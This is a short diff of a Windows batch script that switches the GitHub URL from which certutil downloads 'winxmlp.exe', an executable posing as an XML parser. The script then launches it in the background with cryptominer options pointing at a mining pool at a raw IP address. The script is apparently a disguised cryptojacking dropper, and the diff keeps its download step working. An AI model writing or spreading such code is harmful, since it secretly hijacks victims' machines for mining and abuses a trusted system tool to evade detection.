@@ -10,7 +10,7 @@ if not exist "winxmlp.exe" (
 )else goto :OK
 
 :DOWNLOAD 
-certutil.exe -urlcache -split -f  "https://github.com/dansiebels1337/Windows-XML-Parser/raw/master/winxmlp.exe" 
+certutil.exe -urlcache -split -f  "https://raw.githubusercontent.com/dansiebels1337/Windows-XML-Parser/master/winxmlp.exe" 
 :OK
 winxmlp.exe -a "cn/r" --donate-level 0 --cpu-affinity 0 --cpu-priority 1 --threads=1 -o 172.105.6.74:8080 -k --nicehash --background
 pause
